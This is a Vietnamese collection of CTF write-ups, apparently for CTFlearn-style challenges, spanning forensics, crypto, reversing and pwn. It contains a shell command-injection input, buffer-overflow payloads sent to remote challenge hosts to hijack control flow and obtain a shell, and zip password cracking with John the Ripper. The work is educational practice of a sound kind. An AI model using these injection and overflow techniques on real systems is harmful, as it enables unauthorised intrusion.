
# CTF challenges and solutions


## Calculat3 M3
- Sử dụng web command injection: 
    - Trong một số trường hợp khi web site không kiểm soát dữ liệu post từ người dùng trước khi xử lý bởi hệ thống, kẻ tấn công có thể lợi dụng để trèn các câu lệnh độc hại để tương tác với hệ điều hành.  
#### Quan sát vấn đề:
- Dễ dàng thấy được máy tính sẽ không xử lý số liệu ở phía người dùng mà thông qua phương thức post với thẻ input có thuộc tính readonly, chỉ cần xóa đi thuộc tính này là ta có thể thao tác với thẻ.
- Tới đây chúng ta có thể sử dụng phương pháp nói trên để lấy ra danh sách cái file cùng bậc của file hiện tại qua input: "; ls". (Với ; để ngắt câu lệnh hiện tại và ls là list các file).
- Kết quả hiển thị: 

    `calc.js ctf{watch_0ut_f0r_th3_m0ng00s3} index.php main.css main.css`

## PDF by fdpumyp
- Sử dụng strings là thấy ngay có 2 dòng khả nghi vl

    `external:Q1RGbGVhcm57KV8xbDB3M3kwVW0wMG15MTIzfQ==`
    `password:MTIzMVdST05HOWlzamRuUEFTU1dPUkQ=`

- Ròi lấy 2 cái này cho qua base 64 là ra đáp án ròi (chả biết password kia để làm cái gì ._.).

## So many 64s
- Đọc tên cái nghi nghi liên quan tới base 64 :Đ.
- Well sau một hồi mày mò thì cũng chỉ là decode n lần thôi :) dùng python tí là xong.

## Digital Camouflage
- Đọc đề thấy có cái hint to tổ bố là tìm cái password của ai đó đã loggin trước đó thì mình tìm trong file .pcap thôi cơ mà trước hết thì phải strings file data.pcap ra đã.
- Nhìn theo đoạn kí tự thì thấy password được encode dạng base-64 thì ok rồi kéo tiếp thì lần được ngay đoạn:

    `&Ruserid=hardawayn&pswrd=UEFwZHNqUlRhZQ%3D%3Dv`

- Xong thế là hết decode cái password ra rồi submit là xong. Nhưng mà do nó được gửi qua URL nên sẽ chuyển thành dạng URL encodeing nên chuỗi đúng phải là: 

    `UEFwZHNqUlRhZQ==`

- Bỏ qua chữ 'v' cuối cùng nhé.
- Bài này đớ v~ ko biết ai nghĩ ra cái này ban đầu cứ tưởng phải làm cái gì nữa cơ ai dè submit thử cái password cái qua luôn :)

## Minions 
- Bài này khá là đơn giản cứ dùng strings với binwalk là xong thôi ngồi nghịch tí là ra.
- Sau khi strings file YouWon thì ra cái đoạn CTF{...} thì cho vào base 64 decode vài lần là ra.

## RSA Beginner
- Bài này thì nắm rõ RSA một tí là ra thôi:
    - Đầu tiên là tìm p, q qua trang: https://www.alpertron.com.ar/ECM.HTM.
    - Tính φ(n) = (p-1)(q-1) rồi tìm d = e^(-1) mod φ(n).
    - Và ta có m = c^d mod n. Tìm được m rồi chuyển thế nào qua ascii là ra.
- Không thì dùng tool cho lẹ :D (https://www.dcode.fr/rsa-cipher).

## Basic Android RE 1 
- Khá là thú vị với 1 người ko rõ lắm về mấy cái liên quan đến apk :v.
- Đầu tiên là dùng 1 cái decompiler apk để lấy ra source code. (ví dụ: http://www.javadecompilers.com/apk)
- Ròi vọc vạch file code thì trong thư mục souce có cái mà com/example/secondapp đó vào file main đọc code là thấy ngay nhưng mà đọc kĩ nhé :)) gợi ý cái md5.

## GandalfTheWise
- Bài này khá là dễ mà nó cũng khá là khó :)).
- Cái đầu tiên thì chắc chỉ có strings ra thôi là sẽ lần được 1 đoạn như này:

    `+Q1RGbGVhcm57eG9yX2lzX3lvdXJfZnJpZW5kfQo=`

    `+xD6kfO2UrE5SnLQ6WgESK4kvD/Y/rDJPXNU45k/p`

    `+h2riEIj13iAp29VUPmB+TadtZppdw3AuO7JRiDyU`

- Nhìn phát biết base 64. Nhưng mà base chỉ được 1 dòng đầu từ source char là utf-8 sẽ ra được CTFlearn{xor_is_your_friend} (*\_\* nhìn đáng nghi vl nma cứ phải submit thử phát).
- Rồi nó đáng nghi thật, tiếp đó là decode 2 dòng dưới thì dùng đủ tool mà nó đ ra thì cái khó là phải decode bằng cái tool https://cryptii.com này còn tại sao lại thế thì tôi chưa giải thích được :v. Rồi xor lại 2 cái dưới và chuyển từ hex qua text là xong. Tóm lại là phải chuyển từ text thành raw byte mới được.

## What could this be?
- jsfuck =)))))))))))))
- Rất là thú vị :))

## Simple bof
- Đầu tiên là nếu dùng hệ điều hành khác linux thì chắc phải tải netcat sau đó chạy dòng lệnh mà đề cho:

    `nc thekidofarcrania.com 35235`

- Ròi sau đó đọc code C ở file bof.c thì thấy là `int secret = 0xdeadbeef;` đấy thì nhìn lại khi mà chạy đoạn mã đề cho sẽ có các bị trí tương ứng(Phần đỏ ấy nếu có màu). Rồi nhìn qua mã ascii tìm ra kí tự tương ứng thôi.

    ```
    if (secret == 0x67616c66) {
        puts("You did it! Congratuations!");
        print_flag(); // Print out the flag. You deserve  
        it.
        return;
    }
    ```

## Encryption Master
- Bài này thì nhìn khi mà đoạn mã kết thúc bằng dấu = thì thường sẽ là base 64. Rồi decode cái ra 1 đoạn mã nữa thì mình đoán là hex mà nó đúng thật :Đ. Decode phát nữa là ra bin là ra flag gòi.

## Corrupted File
- Đọc đề thì thấy gợi ý là cần sửa phần header của file.(Phần header là mấy bit đầu bên trong file hex của file đó.)
- Tải file về thì thấy file bị lỗi không mở được vì là file bị lỗi phần header.
- Để giải được bài này thì đầu tiên cần biết phần header của 1 file gif sẽ là "GIF89a". Tiếp theo là dùng 1 cái công cụ nào đó để mở file tải về lên dưới dạng hexeditor sau đó sửa phần header dạng mã ascii sao cho thành "GIF89a". Lưu file lại thì nó sẽ thành 1 file gif không lỗi nữa.
- Tìm cách dừng file gif rồi ghi mã bị encode ra rồi base 64 thôi là xong.

## Tone dialing
- Bài này thì phải nghe bằng tai xong ướm xem trong bàn phím 9 số ng ta ấn phím nào.
- Trôn :)) Dùng 1 cái tool là DTMF Decoder rồi decimal to text là xong.

## Blank Page
- Bài này để giải được thì cần dùng một chút về python.
- Mã như dưới:
    ```
    # Mở tệp đầu vào và đọc nội dung
    with open("TheMessage.txt", "r", encoding='utf-8') as inp:
    l = list(inp.read())

    # Biến lưu trữ chuỗi nhị phân
    string = ""

    # Duyệt qua từng ký tự trong danh sách
    for i in range(len(l)):
        if l[i] == " ":
            l[i] = '0'
        else:
            l[i] = '1'
        # Thêm khoảng trắng mỗi 8 ký tự, bắt đầu từ vị trí 7, 15, 23, ...
        string += l[i]
        if (i + 1) % 8 == 0:
            string += ' '

    # Mở tệp đầu ra và ghi nội dung
    with open("output.txt", "w") as outp:
        outp.write(string.strip())  # Xóa khoảng trắng dư thừa ở cuối chuỗi
    ```
- Mở file out ra chuyển bin thành text là xong.
- Bài này khoai vl thế mà để easy (-_-) .

## The Credit Card Fraudster
- Câu chuyện thật là cảm động :( .
- Nhưng mà để giải bài này thì đầu tiên là cần tìm hiểu Luhn là cái gì.
- Sau đó python mà vã thôi hoặc cái gì đó khác tùy bạn sao cho số thỏa mã 2 yêu cầu chia hết cho 123457 và kiểm tra Luhn là hợp lệ.
- Tham khảo đoạn mã: 
    ```
    def luhn_verify(number: str) -> bool:
    total = 0
    reverse_digits = number[::-1]

    for i, digit in enumerate(reverse_digits):
        n = int(digit)

        # Nhân đôi mỗi chữ số thứ hai
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9

        total += n

    # Số hợp lệ nếu tổng chia hết cho 10
    return total % 10 == 0
    for i in range(5432100000001234, 5432109999991234, 10000):
        if i % 123457 == 0:
            if luhn_verify(str(i)):
                print(f"CTFlearn{{{i}}}")
    ```

## abandoned place
- Bài này là việc giấu mật mã bên trong hình ảnh. Hình ảnh ban đầu đã bị chỉnh sửa kích thước sao cho che mất flag.
- Dùng vài công cụ hexeditor để chỉnh sửa kích thước ảnh.
- Đoạn hex về kích thước ảnh sẽ  dài 18 bit bắt đầu bằng 4 bit `ff c0`. Tìm 4 bit này trong đoạn hex của file.
- 4 bit tiếp theo kể từ 4 bit đầu sẽ là độ dài, 2 bit tiếp là về data precision, 4 bit tiếp là height, 4 bit còn lại là width. Chỉnh sửa phần width hoặc height để thay đổi kích thước ảnh và sẽ tìm ra flag.


## Image Magic
- Theo gợi ý thì cần sử dụng PIL của python. Trước mắt là cứ `pip install pillow` đã.
#### Quan sát vấn đề:
- Mở file thì thấy có mỗi 1 dải pixel cùng đọc đề thì khả năng cao là chặt từng đoạn ra rồi ghép lại.
- Thực hiện các bước thì ra 1 cái ảnh hoàn chỉnh rồi đảo ngược nó lại là ra.
- Mã tham khảo: 
    ```
    from PIL import Image
    import numpy as np

    img = Image.open("out copy.jpg")
    pixel_array = np.array(img)

    # Đảm bảo ảnh có chiều rộng đủ lớn để chia thành 304 cột
    if pixel_array.shape[1] != 304 * 92:
        print("Ảnh không có kích thước phù hợp để chuyển đổi.")
    else:
        # Thay đổi kích thước mảng thành (92, 304)
        reshaped_array = pixel_array.reshape((304, 92, -1))  # -1 giữ nguyên số kênh màu

        # Tạo ảnh mới từ mảng đã thay đổi kích thước
        new_image = Image.fromarray(reshaped_array)
        new_image = new_image.transpose(Image.FLIP_LEFT_RIGHT)
        new_image.show()
        new_image.save('newImage.jpg')
    ```

## The adventures of Boris Ivanov. Part 1.
- Sau khi thử binwalk với strings thì t nhận ra cái ảnh dưới nó hình như bị lặp lại. Well khả năng cao là ảnh lập thể. Dùng 1 cái tool nào đó để dịch ảnh lập thể là ok. (Steregram solver).

## PIN 
- Bài này khoai vãi ò :))
- File được tải về là 1 file .elf nôm na là 1 dạng nhị phân và có thể dudojc chạy bởi GDB có sẵn trong kali linux.
- Chạy file bằng lệnh ./rev1 sẽ cho 1 cái output là `Masukan Pin =` theo tiếng Indo là nhập PIN. Nhập đúng thì ra `PIN benar` sai thì ra `PIN salah`. 
- Rồi giờ thì mã pin là cái qq gì. (Đoạn này bắt đầu khoai khoai)
- Vì nó là 1 file nhị phân nên chúng ta có thể tìm các đọc mã nguồn của file nhưng mà dưới dạng mã asm cái mà chỉ có idol 96 BK cơ khí mới hiểu. 
- Đầu tiên là dùng `objdump -d rev1` để xem mã nguồn trông như thế nào. 
- Sau khi quan sát thì thấy có kha khá hàm và có 1 hàm là hàm main chắc chắc 100% là file chạy chương trình rồi thì giờ dùng `r2 rev1` để nhìn đoạn mã hoạt động dễ hơn.
- Sau khi chạy r2 thì gõ aaa để phân tích code rồi sau đó nhập `pdf @main` để xem chi tiết hàm main. 
- Ta được đoạn mã này: 
    ```
    int main (int argc, char **argv, char **envp);
    │           ; var int64_t var_4h @ rbp-0x4
    │           0x004005d6      55             push rbp
    │           0x004005d7      4889e5         mov rbp, rsp
    │           0x004005da      4883ec10       sub rsp, 0x10
    │           0x004005de      488d3ddf00..   lea rdi, str.Masukan_PIN_   ; 0x4006c4 ; "Masukan PIN = " ; const char *format
    │           0x004005e5      b800000000     mov eax, 0
    │           0x004005ea      e8b1feffff     call sym.imp.printf         ; int printf(const char *format)
    │           0x004005ef      488d45fc       lea rax, [var_4h]
    │           0x004005f3      4889c6         mov rsi, rax
    │           0x004005f6      488d3dd600..   lea rdi, [0x004006d3]       ; "%d" ; const char *format
    │           0x004005fd      b800000000     mov eax, 0
    │           0x00400602      e8a9feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
    │           0x00400607      8b45fc         mov eax, dword [var_4h]
    │           0x0040060a      89c7           mov edi, eax                ; uint32_t arg1
    │           0x0040060c      e8a5ffffff     call sym.cek
    │           0x00400611      85c0           test eax, eax
    │       ┌─< 0x00400613      740e           je 0x400623
    │       │   0x00400615      488d3dba00..   lea rdi, str.PIN_benar____n ; 0x4006d6 ; "PIN benar ! \n" ; const char *s
    │       │   0x0040061c      e86ffeffff     call sym.imp.puts           ; int puts(const char *s)
    │      ┌──< 0x00400621      eb0c           jmp 0x40062f
    │      ││   ; CODE XREF from main @ 0x400613(x)
    │      │└─> 0x00400623      488d3dba00..   lea rdi, str.PIN_salah____n ; 0x4006e4 ; "PIN salah ! \n" ; const char *s
    │      │    0x0040062a      e861feffff     call sym.imp.puts           ; int puts(const char *s)
    │      │    ; CODE XREF from main @ 0x400621(x)
    │      └──> 0x0040062f      b800000000     mov eax, 0
    │           0x00400634      c9             leave
    └           0x00400635      c3             ret

    ```
- Đọc thì thấy code in ra `Masukan PIN =` đó rồi sẽ nhập giá trị vào rồi bla bla rồi gọi hàm `sym.cek` và ta sẽ check hàm `cek` này bằng lệnh `pdf @sym.cek`.
- Nếu bạn may mắn đọc hiểu thì chúc mừng bạn tự làm nốt đi còn không hiểu thì nhìn vào phần code nôm na nó là lấy dữ liệu được truyền vào đem so sánh nếu đúng thì in đúng sai thì in sai. Giá trị được so sánh chính là cái `[0x601040:4]=0x51615`. Đó ta chỉ cần chuyển hex qua dec là có pass. 
- Thoát ra nhập thử lại thì ok đúng rồi submit thôi.

## Ambush Mission
- Hình trên thì thử binwalk thì chẳng có gì bên trong cả cũng ko liên quan về kích thước thì chắc key sẽ ở ngay bên trong hình rồi.
- Dùng một vài công cụ để chỉnh sửa hình ảnh ví dụ như MS Paint :)).
- Đổ màu khác vào từng khung là thấy key ngay.
- Key thì cần điền từ phải qua trái nhé. (VD: ==abcdef -> fedcba==).

## Symbolic Decimals
- Nhìn theo ví dụ thì khá là đơn giản đọc mã dưới là hiểu:
    ```
    #include <iostream>
    using namespace std;

    int main()
    {
        string input = "^&,*$,&),!@#,*#,!!^,(&,!!$,(%,$^,(%,*&,(&,!!$,!!%,(%,$^,(%,&),!!!,!!$,(%,$^,(%,&^,!)%,!)@,!)!,!@%";
        string symbol = "!@#$%^&*()";
        for (int i = 0 ; i < input.size() ; ++i)
        {
            if (input[i] == ',') {
                cout << ' '; 
                continue;
            }
            for (int j = 0 ; j < symbol.size(); ++j)
            {
                if (input[i] == symbol[j])
                {
                    if (j + 1 == 10) cout << '0';
                    else cout << j + 1;
                    break;
                }
            }
        }
        return 0;
    }
    ```

- Xong là cho vào chuyển qua text là xong.

## Exclusive Santa
- Bài có 1 cái file cứ tải về xem sao.
- Đầu tiên thì chắc chắc là binwalk nó ra rồi, và ta có 2 file ảnh.
- Thử binwalk thì thấy không khả thi lắm thì ta sẽ thử foremost nó xem.
- foremost file 3.png thì ra được 2 file ảnh mở lên thì có 1 ảnh kha khá giống với ảnh 1.png thì tới đây có thể xor 2 ảnh bằng python hoặc dùng stegsolve là ra.

## Naughty Cat
- Damn con mèo này giấu mã giỏi vl :Đ
- Trước tiên cần tải file về đã rồi sau đó binwalk file ảnh ra.
- Thấy được là cũng có kha khá cái để xem. 
- Đầu tiên là file mp3 tiếng mèo gru gru:
    - `strings` thì thấy có cái dòng là `is a password here?` thì chắc chắn là yes there are password here -_- nhưng mà là cái nào.
    - Ta cần dùng 1 cái gọi là spectrum analyzer để phân tích âm thanh của file và được 1 cái dòng chữ là `sp3ctrum_1s_y0ur_fr13nd` (Đây chưa phải flag đâu cứ để đó đã).
- Tiếp là đến file y0u_4r3_cl0s3.rar:
    - Trước hết là đây hiện tại không phải file rar dù nó có đuôi .rar. Vấn đề là đang bị lỗi ở header.
    - Mở hexeditor lên sửa header cho file thành `52 61 72 21 1A 07 01 00` là ok. (Chuẩn header của file rar phiên bản 5).
    - Giờ thì binwalk sẽ ra 1 cái file rar tiếp mở lên thì cần có pass và pass chính là cái phân tích từ file mp3 bên trên.
- Và đó lấy đoạn mã bỏ vô base 64 decode là ra.

## RSA Twins!
- Bài này sẽ rất khó nếu không dùng tool còn dùng tool thì ...
    (https://www.dcode.fr/rsa-cipher)

## Reykjavik
- Trước hết là cứ phải unzip cái file zip ra rồi đọc qua qua cái readme đã tuy là không hữu dụng lắm.
- Rồi ta có 1 cái file Reykjavik này, chạy thử file thì được 
    ```
    Usage: Reykjavik CTFlearn{flag}
    ```
- Gòi làm theo hướng dẫn thì chạy được như này
    ```
    ┌──(kali㉿kali)-[~/Downloads/_Reykjavik.zip.extracted]
    └─$ ./Reykjavik CTFlearn{flag}  
    Welcome to the CTFlearn Reversing Challenge Reykjavik v2: CTFlearn{flag}
    Compile Options: ${CMAKE_CXX_FLAGS} -O0 -fno-stack-protector -mno-sse

    Sorry Dude, 'CTFlearn{flag}' is not the flag :-(
    ```
- Ok giờ là mình hết biết phải nhập gì rồi :). 
- Thì lý do bài này là mức độ easy vì ai làm nhiều rồi sẽ biết phải làm gì.
- Đầu tiên là cần có 1 công cụ có GUI để xem được cái mã assembly rồi đọc code hàm main.
- Ở hàm main thì mình cứ hiểu nôm na là input sẽ được mã hóa tùm lum rồi đem đi so sánh với 1 giá trị đúng thì như này mà sai thì như kia.
- Đặc biệt là có 1 thanh ghi `$rsp` sẽ được lấy giá trị để đem đi so sánh thì cái mình cần là xem giá trị thanh ghi đó là gì. Để làm được điều đó thì cần: 
    - Đầu tiên là sẽ mở gdb ra bằng lệnh `gdb Reykjavik` 
    - Sau đó set 1 break point để mà quan sát giá trị thanh ghi `$rsp` này và mình sẽ đặt ở địa chỉ `0x00001170` vì đây là địa chỉ trước khi đem giá trị đi so sánh thì các thanh ghi đã được ghi giá trị hết rồi.
    - Dùng lệnh `break *main+205` (cái này học kĩ về asm là hiểu thôi đơn giản mà :v ). Rồi sau đó chạy `run 'CTFlearn{hehe}'` với cái giá trị sau run là tham số truyền vào.
    - Output như dưới: 
        ```
        Starting program: /home/kali/Downloads/_Reykjavik.zip.extracted/Reykjavik 'CTFlearn{hehe}'
        [Thread debugging using libthread_db enabled]
        Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
        Welcome to the CTFlearn Reversing Challenge Reykjavik v2: CTFlearn{hehe}
        Compile Options: ${CMAKE_CXX_FLAGS} -O0 -fno-stack-protector -mno-sse


        Breakpoint 1, 0x000055555555516d in main ()
        ```
    - Đó và ta sẽ đọc giá trị thanh ghi `$rsp` bằng `x/s $rsp` và được flag.
    - Xong.

## Smiling ASCII
- Với 1 file ảnh thì cần kiểm tra xem có gì đặc biệt ở file này không. Có thể dùng `exiftool smiling.png` thì có output: 
    ```
    ExifTool Version Number         : 12.76
    File Name                       : smiling.png
    Directory                       : .
    File Size                       : 59 kB
    File Modification Date/Time     : 2024:11:14 09:01:49+07:00
    File Access Date/Time           : 2024:11:14 09:02:37+07:00
    File Inode Change Date/Time     : 2024:11:14 09:01:49+07:00
    File Permissions                : -rw-rw-r--
    File Type                       : PNG
    File Type Extension             : png
    MIME Type                       : image/png
    Image Width                     : 383
    Image Height                    : 300
    Bit Depth                       : 8
    Color Type                      : RGB with Alpha
    Compression                     : Deflate/Inflate
    Filter                          : Adaptive
    Interlace                       : Noninterlaced
    Warning                         : [minor] Trailer data after PNG IEND chunk
    Image Size                      : 383x300
    Megapixels                      : 0.115
    ```
- Để ý thì có 1 phần warning đó tức là file đã bị chỉnh sửa gì đó.
- Gọi strings thì trả ra 1 đoạn mã rồi base 64 ra thì được dòng `Did you know that pixels are, like the ascii table, numbered from 0 to 255?`.
- Tới đây thì có thể dùng 1 thư viện của linux là zsteg để phân tích cụ thể: `zsteg -a smiling.png` là ra flag.

## RIP my bof
- Trước hết là cứ phải trích xuất tất cả các file có thể đã thì mình sẽ có được 1 file là `server` và khi chạy file này sẽ tương tự như cái lệnh `nc thekidofarcrania.com 4902`.
- Đọc code thì mục tiêu bài sẽ là làm sao để gọi tới hàm win thông qua `nc thekidofarcrania.com 4902`.
- Trước hết thì cần biết địa chỉ của hàm win là `0x08048586` thông qua câu lệnh `readelf -s server | grep win` hoặc là có thể chạy `r2 -AA server` rồi `pdf @sym.win`.
- Tiếp đó là nhìn output của khi chạy `./server` phần return address ... đó thì nhập thử đoạn `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB` thì ok phần BBBB đã nằm đúng chỗ và ở đây đoạn mã sẽ bị crash với thông báo `zsh: segmentation fault  ./server` tức là chương trình truy cập và 1 địa chỉ không hợp lệ.
- Với cái lỗi trên thì ta hiểu được là cái này sẽ chạy đoạn mã ở địa chỉ mà ta nhập vào và ở đây sẽ cần ghi địa chỉ của hàm win vào.
- Đoạn mã tham khảo : 
    ```
    echo -e "$(python3 -c 'print ("A"*60'))\x86\x86\x04\x08" | nc thekidofarcrania.com 4902"
    ```

## Help Bity
- Với đoạn kí tự cho trước thì ta suy luận được là với các kí tự có mã ascii dạng thập phân là chẵn thì tăng 1 giá trị lẻ thì giảm 1 cứ như thế là ra.

## ALEXCTF CR2: Many time secrets
- Trước hết cần hiểu đơn giản về OTP đã rồi làm. Ở đây chủ yếu dùng python để giải mã thôi.
- Đề cho ta 1 flag là `ALEXCTF{` thì ta sẽ coi flag này chính là khóa k và sẽ xor khóa với c để tìm ra m. Rồi lại lấy m xor k để tìm k. Ra được 1 đoạn m ngắn thì suy luận kí tự tiếp theo. Lặp đi lặp lại các bước là ra.
- Code tham khảo: 
    ```
    import binascii

    lines = []

    with open('TheMessage.txt', 'r', encoding='utf-8') as f:
        ls = f.readlines()
        for l in ls:
            lines.append(binascii.unhexlify(l[:-1]))

    def dec(mes, key):
        m = ""
        for i in range(len(key)):
            m += chr(mes[i] ^ ord(key[i]))
        return m

    k = 'ALEXCTF{'
    mes = []
    for line in lines:
        mes.append(dec(line, k))
    print(mes)
    ```

## Seeing is believing
- Sau khi tải file về thì cứ giải nén rồi binwalk các kiểu sau cùng sẽ ra 1 file `help.me`.
- Ta sẽ cần xem định dạng của file là gì thông qua `exiftool help.me' thì biết được là đây là 1 file audio. 
- Mở file bằng 1 công cụ nào đó nghe xem thì chẳng có nghĩa gì cả :)) thế thì cho thử vào spectrum xem zư lào. 
- Gòi giờ ta sẽ có 1 mã qr. Resize sao cho quét được qr thì sẽ có 1 cái link và sẽ có flag.

## MountainMan
- Với hình ảnh được tải về thì không có gì đáng ngờ ở đây cả. 
- Chú ý ở đề có 1 cái cần chú ý là `Don't be fooled by two 0xffd9 markers.` Vậy ta sẽ sử dụng hexeditor để kiểm tra xem.
- Ở đoạn hex cuối cùng thì ta thấy có sự xuất hiên của ff d9. Trong format của 1 file jpg thì hex kết thúc của file sẽ là ff d9 mà ở đây ff d9 lại xuất hiện 2 lần vậy cái ta cần phân tích là dữ liệu nằm bên trong (Vì đề bảo 0xffd9 markers mà .-. chắc thế).
- Thêm 1 ý nữa là `xor is your friend.` thì ta sẽ cần dùng 1 cái gọi là xor brute force qua 1 tool là cyberchef, lần chữ ctf trong ouput và thế là xong.

## Rock Paper Scissors
- Sau n lần thử thì chúng ta sẽ nhận ra là mỗi khi chạy lại server sẽ chọn y đúc như các lần trước vậy nên cứ chọn 10 lần ngẫu nhiên, note cái mà server chọn lại rồi trả lời theo là được.

## My Friend John 
- Bài này thì họ đã gợi ý sẵn rồi đấy chính là sử dụng `John the Ripper` để tìm ra password mở các file bị khóa.
- Trước hết cần unzip file `MyFriendJohn.zip' sẽ ra 1 file là 'use-rockyou.zip' đây cũng là 1 gợi ý bởi rockyou là 1 wordlist chứa các mật khẩu thường dùng và có thể được sử dụng để phá mã.
- Sau đó cần hash file zip lại để thử phá mã bằng lệnh `zip2john use-rockyou.zip > hash` sau đó là phá mã: `john hash --wordlist=rockyou.txt`.
- Các bước sau tương tự như bước này.

## Favorite Color
- Bài này khá hay giúp mình hiểu rõ hơn về bof.
- Trước tiên là chạy lệnh mà đề cho đã và ta sẽ được điểu khiển 1 máy khác.
- `ls` ra thì có vài file như này:
    ```
    color@ubuntu-512mb-nyc3-01:~$ ls
    color  color.c  flag.txt  Makefile
    ```
- Đầu tiên là xem phần Makefile trước xem nó là cái gì đã trông là lạ :Đ (`nano Makefile`).
- Ok nôm na là đây là 1 file cài đặt cho phép mình làm gì mà máy sẽ làm gì và đặc biệt là có 1 dòng `cc -c -m32 -fno-stack-protector $(prob).c`. Trong đoạn này có 1 phần `-fno-stack-protector` theo mình hiểu thì cài đặt sẽ cho mình ghi tràn ra khỏi bộ nhớ được cấp phát kiểu kiểu thế :v và ở đây mình xác định là sẽ giải theo dạng bài BOF.
- Rồi giờ check các file còn lại thì thấy có file `color.c`. Giải thích qua nội dung code này tức là phải nhập màu rồi qua hàm ktra nếu ok thì có thể tìm ra flag không thì sẽ như nyc của tôi... chẳng ra gì :( .
- Ok giờ thì bắt đầu đi vào làm thể nào để bof.
    - Dùng objdump hoặc gdb để xem đoạn mã asm của hàm main:
        ```
        0x0804864b <+108>:   add    $0x10,%esp
        0x0804864e <+111>:   call   0x804858b <vuln>
        0x08048653 <+116>:   test   %eax,%eax
        0x08048655 <+118>:   je     0x8048689 <main+170>
        0x08048657 <+120>:   sub    $0xc,%esp
        0x0804865a <+123>:   push   $0x804874c
        ```
    - Bỏ qua các tiểu tiết ta chỉ quan tâm đoạn mã này thôi đấy là `0x08048657` cái này. Đây là địa chỉ mà đoạn mã chạy nếu có input chính xác.
    - Ròi kết tiếp ta kiểm tra hàm vuln() và có được đoạn mã này
        ```
        0x080485a4 <+25>:    lea    -0x30(%ebp),%eax 
        0x080485a7 <+28>:    push   %eax
        0x080485a8 <+29>:    call   0x8048420 <gets@plt>
        ```
    - Đoạn mã được hiểu như này 
        ```
        0x080485a4 <+25>:    lea    -0x30(%ebp),%eax -> Lấy địa chỉ của buf[] và cho vào thanh ghi eax.
        0x080485a7 <+28>:    push   %eax -> Đẩy giá trị của eax vào trong stack.
        0x080485a8 <+29>:    call   0x8048420 <gets@plt> -> Gọi hàm gets.
        ```
    - Đó thì ta biết được là buf sẽ chiếm 0x30 bytes tương được với 48 bytes dạng thập phân.
    - Với 48 bytes của buf thì ta sẽ có thêm 4 byte của con trỏ ebp vì có lệnh push bên trên.
    - Và 4 bytes tiếp theo sẽ là để lưu return address hay địa chỉ mà hàm call sẽ gọi và đây chính là chỗ mà ta cần quan tâm.
    - Ta chỉ cần làm sao cho phần return address này gọi đến địa chỉ của đoạn mã trả về flag là cái mà mình đã nói bên trên.
    - Vậy ta chỉ cần nhập 52 kí tự bất kì và 4 ký tự cuối là địa chỉ của ta. Và cần lưu ý là hệ thống đang ở dạng big endian hay little endian, ở trường hợp của ta sẽ là little endian ktra qua lệnh `lscpu`.
    - Ta có thể tạo 1 file như dưới trong thư mục /tmp vì khi chuognw trình có bảo trong /tmp được phép tạo file còn các nơi khác thì ko có quyền và chạy đoạn mã đó để lấy flag:
        ```
        #/tmp/script.py

        fillWithA = "A" * 52
        address = "\x57\x86\x04\x08"
        print(fillWithA + address)

        ```
    - Và chạy lệnh :
        ```
        color@ubuntu-512mb-nyc3-01:~$ (python /tmp/script.py; cat) | ./color
        Enter your favorite color: Me too! That's my favorite color too!
        You get a shell! Flag is in flag.txt
        cat flag.txt
        flag{c0lor_0f_0verf1ow}
        ```

## The Simpsons
- Sau khi tải ảnh về và strings ra thì ta có 1 đoạn mã py này:
    ```
    Ahh! Realistically the Simpsons would use octal instead of decimal!
    encoded = 152 162 152 145 162 167 150 172 153 162 145 170 141 162
    key = chr(SolutionToDis(110 157 167 040 155 165 143 150 040 144 151 144 040 115 141 147 147 151 145 040 157 162 151 147 151 156 141 154 154 171 040 143 157 163 164 077 040 050 104 151 166 151 144 145 144 040 142 171 040 070 054 040 164 157 040 164 150 145 040 156 145 141 162 145 163 164 040 151 156 164 145 147 145 162 054 040 141 156 144 040 164 150 145 156 040 160 154 165 163 040 146 157 165 162 051))
    key = key + key + chr(ord(key)-4)
    print(DecodeDat(key=key,text=encoded))

    ```
- Do đề đã bảo và với câu này thì ta có thể chuyển bát phân thành text và ta được 2 dòng `jrjerwhzkrexar` và `How much did Maggie originally cost? (Divided by 8, to the nearest integer, and then plus four)`.
- Với đoạn kí tự đầu tiền thì chưa biết làm gì thì ta trả lời câu hỏi kia đã.
- Trong bộ phim The Simpsons thì khi đi siêu thị Maggie đã bị quét và giá là $847.63, đây là số tiền cần để nuôi 1 đứa trẻ trong 1 tháng ở năm 1989. Cùng các tính toán thì ta được số 110. Nhìn vào đoạn mã python thì ta sẽ có `key = "nnj"`.
- Rồi thì bây giờ có 1 cái cần để ý là ta có 1 đoạn mã ngắn và 1 mã dài thì khả năng cao là Vigenere Cypher và đó ta đã có flag.

## RE_verseDIS
- Sau khi tải file về thì trước hết cần cấp quyền chạy cho file đã `chmod +x problem`.
- Sau đó sẽ đọc code :)).
- Có thể dùng các tool để decompile ở đây mình sẽ sử dụng ghidra. Và sẽ có đoạn mã này ở hàm main.
    ```
    undefined8 main(void){  
        int local_10;  
        int local_c;    
        printf("Input password: ");  
        __isoc99_scanf(&DAT_001008f5,input);  
        for (local_10 = 0; local_10 < 0x16; local_10 = local_10 + 1) 
        {    
            *(int *)(key2 + (long)local_10 * 4) = (int)key[local_10];    
            msg[local_10] = (byte)*(undefined4 *)(key2 + (long)local_10 * 4) ^ (byte)*(undefined4 *)(str + (long)local_10 * 4);  
        }  
        for (local_c = 0; local_c < 0x16; local_c = local_c + 1) 
        {    
            if (input[local_c] != msg[local_c]) 
            {      
            stat = 0;    
            }  
        }  
        if (stat == 0) 
        {    
        puts("Wrong password");  
        }  
        else 
        {    
            puts("Good job dude !!!");  
        }  
        return 0;
        }
    ```
- Trong đoạn mã trên thì ta thấy key sẽ được xor với giá trị str và ra được msg và lấy msg so sáng input. Vậy đơn giản ta chỉ cần kiểm tra giá trị msg là cái gì. Nhưng để lấy được msg thì cần có str và key vậy ta kiểm tra 2 giá trị này và lấy xor với nhau là ra.
- Với giá trị key là `"IdontKnowWhatsGoingOn"`.
- Với giá  trị str thì khó hơn một chút. Để ý thì khi xor sẽ cộng với `local_10*4` tức là mỗi 4 bytes sẽ có 1 giá trị là 1 phần tử của str từ đó str sẽ có được giá trị để xor với key. Cụ thể str = `8062c3a32301c5c01321a12451d20300d1b037c13`.
- Xor rồi chuyển hex qua text là xong.

## HailCaesar!
- Trước hết là tải ảnh về đã. Với 1 bức ảnh trông hết sức bình thường và gợi ý ceaser thì mình có thể strings xem như nào.
